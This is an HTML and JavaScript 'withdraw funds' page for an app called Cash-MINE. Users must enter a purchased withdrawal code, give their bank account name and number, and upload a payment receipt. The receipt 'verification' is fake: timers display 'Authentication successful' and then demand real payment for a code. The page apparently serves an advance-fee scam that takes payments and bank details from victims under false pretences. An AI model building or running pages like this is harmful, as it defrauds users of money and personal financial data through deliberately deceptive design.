<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cash-MINE - Withdraw</title>
  <link rel="manifest" href="/manifest.json">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Inter',system-ui,sans-serif; background:#f5f7fa; color:#1e293b; min-height:100vh; padding:24px 16px; }
    .container { max-width:480px; margin:0 auto; }
    h2 { text-align:center; font-size:26px; font-weight:700; color:#0f172a; margin-bottom:32px; }
    .card { background:white; border-radius:20px; padding:24px; margin-bottom:24px; box-shadow:0 8px 24px rgba(0,0,0,0.08); transition: transform 0.2s; }
    .card.active { transform: translateY(-4px); }
    .form-group { position: relative; margin-bottom:28px; }
    .form-group input { width:100%; padding:16px; border:1.5px solid #cbd5e1; border-radius:12px; font-size:16px; background:#f8fafc; transition:all 0.2s; }
    .form-group input:focus { outline:none; border-color:#3b82f6; box-shadow:0 0 0 3px rgba(59,130,246,0.15); }
    .form-group label { position:absolute; left:16px; top:50%; transform:translateY(-50%); color:#64748b; pointer-events:none; transition:all 0.25s ease; }
    .form-group input:focus + label, .form-group input:not(:placeholder-shown) + label { top:-10px; left:12px; font-size:12px; padding:0 6px; background:white; color:#3b82f6; }
    button { width:100%; padding:16px; font-size:16px; font-weight:600; border-radius:12px; border:none; cursor:pointer; transition:all 0.2s; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
    .primary-btn { background:#3b82f6; color:white; }
    .success-btn { background:#10b981; color:white; }
    .warning-btn { background:#ef4444; color:white; }
    .upload-area { border:2px dashed #cbd5e1; border-radius:16px; padding:32px 16px; text-align:center; margin:20px 0; cursor:pointer; transition:all 0.2s; }
    .upload-area:hover { border-color:#3b82f6; background:#eff6ff; }
    #receiptPreview { max-width:100%; margin-top:16px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); display:none; }
    .warning-box { background:#fee2e2; color:#991b1b; padding:16px; border-radius:12px; margin:20px 0; font-size:14px; line-height:1.5; border-left:4px solid #ef4444; }
    .step-indicator { display:flex; justify-content:space-between; margin-bottom:24px; }
    .step { width:40px; height:40px; background:#e2e8f0; color:#64748b; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:600; font-size:16px; }
    .step.active { background:#3b82f6; color:white; }
    .checking { text-align:center; padding:40px 20px; animation:pulse 2s infinite; }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.6;} }
    .code-input { width:100%; padding:16px; font-size:18px; text-align:center; border:2px solid #cbd5e1; border-radius:12px; margin:12px 0; }
  </style>
</head>
<body>

<div class="container">
  <h2>Withdraw Funds</h2>

  <!-- Step 0: Enter Code -->
  <div class="card" id="codeSection">
    <h3 style="margin-bottom:12px;">Enter Your Withdrawal Code</h3>
    <p style="font-size:14px; color:#64748b; margin-bottom:16px;">
      Enter the 4-digit code you purchased to unlock withdrawal
    </p>
    <input type="text" id="quickCode" class="code-input" placeholder="e.g. 4952 or T329" maxlength="4">
    <button class="primary-btn" onclick="quickWithdraw()">Verify Code</button>
  </div>

  <!-- Step 1: Withdrawal Details -->
  <div class="card" id="withdrawSection" style="display:none;">
    <div class="step-indicator">
      <div class="step active">1</div>
      <div class="step">2</div>
      <div class="step">3</div>
    </div>
    <div class="form-group">
      <input type="text" id="accountName" placeholder=" " required>
      <label>Account Name</label>
    </div>
    <div class="form-group">
      <input type="text" id="accountNumber" placeholder=" " required>
      <label>Account Number</label>
    </div>
    <div class="form-group">
      <input type="number" id="withdrawAmount" placeholder=" " required>
      <label>Amount to Withdraw</label>
    </div>
    <button class="primary-btn" onclick="submitWithdraw()">Submit Withdrawal</button>
  </div>

  <!-- Step 2: Upload -->
  <div class="card" id="uploadSection" style="display:none;">
    <div class="step-indicator">
      <div class="step">1</div>
      <div class="step active">2</div>
      <div class="step">3</div>
    </div>
    <h3 style="text-align:center; margin-bottom:16px;">Upload Payment Proof</h3>
    <div class="upload-area" onclick="document.getElementById('receiptFile').click()">
      <p style="font-weight:500; color:#64748b;">Tap to select receipt from gallery</p>
      <input type="file" id="receiptFile" accept="image/*" style="display:none;">
    </div>
    <img id="receiptPreview" alt="Receipt Preview">
    <button class="primary-btn" onclick="submitReceipt()">Submit for Verification</button>
  </div>

  <!-- Checking -->
  <div class="card" id="checkingSection" style="display:none;">
    <div class="checking">
      <h3 style="color:#3b82f6; margin-bottom:16px;">Verifying Payment...</h3>
      <p id="checkingMessage" style="font-size:16px;">Please wait a moment</p>
    </div>
  </div>

</div>

<script>
  // ───────── Quick Withdraw / Verify Code ─────────
  function quickWithdraw() {
    const code = document.getElementById('quickCode').value.trim().toUpperCase();
    if (!code) return alert("Enter your code");

    fetch('http://127.0.0.1:3000/verify-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code })
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        alert("Code verified! Fill in withdrawal details below.");
        document.getElementById('codeSection').style.display = 'none';
        document.getElementById('withdrawSection').style.display = 'block';
      } else {
        alert("Invalid code. Please check and try again.");
      }
    })
    .catch(err => {
      console.error(err);
      alert("Server error. Try again later.");
    });
  }

  // ───────── Submit Withdrawal ─────────
  function submitWithdraw() {
    const name = document.getElementById('accountName').value.trim();
    const number = document.getElementById('accountNumber').value.trim();
    const amount = document.getElementById('withdrawAmount').value.trim();
    if (!name || !number || !amount) return alert("Please fill all fields");

    fetch('http://127.0.0.1:3000/withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ accountName: name, accountNumber: number, amount })
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        alert(data.message);
        document.getElementById('withdrawSection').style.display = 'none';
        document.getElementById('uploadSection').style.display = 'block';
      } else {
        alert(data.message || "Failed to submit withdrawal");
      }
    })
    .catch(err => {
      console.error(err);
      alert("Server error. Try again later.");
    });
  }

  // ───────── Upload Preview ─────────
  document.getElementById('receiptFile').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = function(ev) {
        const preview = document.getElementById('receiptPreview');
        preview.src = ev.target.result;
        preview.style.display = 'block';
      };
      reader.readAsDataURL(file);
    }
  });

  // ───────── Submit Receipt ─────────
  function submitReceipt() {
    if (!document.getElementById('receiptFile').files.length) {
      return alert("Please select a receipt image");
    }
    document.getElementById('uploadSection').style.display = 'none';
    document.getElementById('checkingSection').style.display = 'block';

    setTimeout(() => {
      document.getElementById('checkingMessage').innerText = "Authentication successful! Your code has been sent to the registered phone number.";
      setTimeout(() => {
        alert("Your code has been sent. No code without real payment.");
      }, 1800);
    }, 4500);
  }
</script>
</body>
</html>
